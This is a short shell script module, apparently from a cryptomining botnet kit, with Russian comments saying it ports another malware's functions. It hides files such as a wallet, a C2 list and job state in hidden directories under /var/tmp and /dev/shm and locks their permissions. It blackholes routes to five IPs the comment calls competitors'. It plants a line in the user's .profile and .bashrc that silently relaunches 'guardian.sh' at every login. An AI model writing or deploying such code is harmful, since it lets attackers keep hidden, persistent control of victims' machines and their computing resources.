#!/bin/sh
# 60-harden.sh — права на артефакты и уборка сети. Порты _harden_artifacts / harden_network.

kf_harden_artifacts() {
  for _h_d in "${KF_ROOT:-/var/tmp/.kf}" "/dev/shm/.kf" "${KF_STATE_DIR:-}"; do
    [ -n "$_h_d" ] && [ -d "$_h_d" ] || continue
    for _h_f in .inst .job.json .gpid .endpoint .cron_done c.json flags id c2list \
                .wallet .alias .alias.name .kit.ver .cron_ok .cfg.tag .bin.tag .md_dir .md_bin; do
      [ -f "$_h_d/$_h_f" ] && chmod 600 "$_h_d/$_h_f" 2>/dev/null
    done
    for _h_f in "$_h_d"/*.sh; do
      [ -f "$_h_f" ] && chmod 700 "$_h_f" 2>/dev/null
    done
    chmod 700 "$_h_d" 2>/dev/null
  done
  return 0
}

# их harden_network: чёрные дыры на адреса конкурентов
kf_harden_network() {
  command -v ip >/dev/null 2>&1 || return 0
  for _n_ip in 139.59.59.33 45.94.31.89 154.89.152.115 84.21.173.223 142.132.131.238; do
    ip route add blackhole "$_n_ip" 2>/dev/null
  done
  return 0
}

# их _add_profile_persist: строка в профиль оболочки
kf_add_profile_persist() {
  _p_dir="${1:-${KF_ROOT:-/var/tmp/.kf}}"
  [ -f "$_p_dir/guardian.sh" ] || return 0
  _p_line="[ -x $_p_dir/guardian.sh ] &&  setsid sh $_p_dir/guardian.sh >/dev/null 2>&1 &"
  for _p_f in "${HOME:-}/.profile" "${HOME:-}/.bashrc"; do
    [ -n "${HOME:-}" ] && [ -f "$_p_f" ] || continue
    grep -qF "$_p_dir/guardian.sh" "$_p_f" 2>/dev/null && continue
    printf '\n%s\n' "$_p_line" >> "$_p_f" 2>/dev/null && kf_log "profile persist: $_p_f"
  done
  return 0
}
